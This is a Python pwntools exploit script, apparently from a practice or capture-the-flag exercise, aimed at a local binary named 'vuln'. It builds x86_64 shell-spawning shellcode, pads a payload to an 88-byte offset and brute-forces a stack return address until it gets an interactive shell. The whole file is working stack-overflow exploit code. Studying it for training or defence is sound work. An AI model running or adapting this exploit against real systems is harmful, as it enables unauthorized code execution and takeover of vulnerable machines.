#!/usr/bin/env python

from pwn import *

exec_path = "../src/vuln"
context.binary = exec_path
e = ELF(exec_path)

log.info("context is: " + str(vars(context)))

# Create x86_64 bit exec shellcode.
# We need to pivot the stack to prevent the shellcode code being written by the shellcode itself.
shellcode_asm = "sub rsp, 512\n" + shellcraft.amd64.linux.sh()
shellcode = asm(shellcode_asm)
log.info("shellcode_asm is: \n" + shellcode_asm)
log.info("shellcode is: {}".format("".join("\\x{:02x}".format(ord(b)) for b in shellcode)))

# TODO: Determine this with GDB PEDA + pattc + patto.
offset = 88

# TODO: Detected from GDB.
approximate_buffer_address = 0x7fffffffddd0

# Loop each 16 bytes starting from approximate_buffer_address - 512 to approximate_buffer_address + 512.
for buffer_address in range(approximate_buffer_address - 1024, approximate_buffer_address + 1024, 8):
    # Start process.
    io = process(exec_path)

    # Create payload
    log.info("Trying address 0x{:0x} as buffer address (shellcode start).".format(buffer_address))
    payload = "\x90" * 16 + shellcode + "A" * (offset - 16 - len(shellcode)) + pack(buffer_address)
    log.info("payload is {}".format("".join("\\x{:02x}".format(ord(b)) for b in payload)))

    # TODO: Update sending and receiving of data from process.

    # Feed payload to trigger overflow and call shellcode.
    io.recvuntil("Give me input: ");
    io.sendline(payload)

    # Check if process segfaults (i.e. returns an EOF).
    # Close process/tube to free resources in case of EOF.
    try:
        io.recv(timeout=3)
        break
    except EOFError:
        io.terminate()
        io.wait()
        io.close()
        io.kill()
        continue

# Profit! Use interactive shell and run shell commands.
io.interactive()
